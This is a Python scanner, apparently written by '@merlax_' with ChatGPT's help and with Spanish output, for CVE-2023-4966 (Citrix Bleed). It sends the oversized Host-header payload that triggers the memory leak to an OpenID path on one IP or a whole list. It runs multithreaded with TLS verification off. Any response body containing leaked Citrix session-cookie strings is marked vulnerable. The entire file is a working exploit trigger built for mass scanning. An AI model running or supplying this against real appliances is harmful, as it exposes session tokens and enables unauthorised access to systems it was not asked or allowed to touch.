import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import concurrent.futures
import sys
from termcolor import colored 
import textwrap
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

payload = "A" * 24812

def make_request(ip, path, retries, resultado):
    url = f"https://{ip}/{path}"
    headers = {
        "Host": payload,
        "Connection": "close"
    }
    for _ in range(retries):
        try:
            response = requests.get(url, headers=headers, verify=False, timeout=10)
            if "Set-Cookie: NSC_AAAC=" in response.text or "Citrix.TcpProxyService" in response.text:
                print(colored(f"[+] Posible vulnerable: {ip}", "green"))
                resultado['afectados'] += 1
                return
        except requests.exceptions.RequestException as e:
            print(colored(f"[-] No vulnerable (error al conectar): {ip}", "red"))
            resultado['no_afectados'] += 1
            return
    print(colored(f"[-] No vulnerable: {ip}", "red"))
    resultado['no_afectados'] += 1

def main():
    banner = textwrap.dedent("""
        +---------------------------------+
        |        CVE-2023-4966            |
        |          @merlax_               |
        +---------------------------------+
    """)
    print(banner)
    parser = argparse.ArgumentParser(description="Check para CVE-2023-4966 by @merlax_ (y chatgpt)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", type=str, help="Path al archivo con la lista de IPs")
    group.add_argument("-i", type=str, help="Ingresar una sola IP")
    parser.add_argument("-t", type=int, default=10, help="Cantidad de threads")
    parser.add_argument("--path", type=str, default="oauth/idp/.well-known/openid-configuration", help="Ruta (path) adicional a la URL")
    parser.add_argument("-r", type=int, default=3, help="NÃºmero de reintentos")
    args = parser.parse_args()
    if args.f:
        with open(args.f, "r") as file:
            ips = [line.strip() for line in file]
    else:
        ips = [args.i]
    resultado = {'afectados': 0, 'no_afectados': 0}
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.t) as executor:
        for ip in ips:
            executor.submit(make_request, ip, args.path, args.r, resultado)
    print("")
    if args.f:
        total_ips = len(ips)
        print(f"[+] Total de IPs en la lista: {total_ips}")
        print(f"[+] IPs vulnerables: {resultado['afectados']}")
        print(f"[-] IPs No afectadas: {resultado['no_afectados']}")

if __name__ == "__main__":
    main()

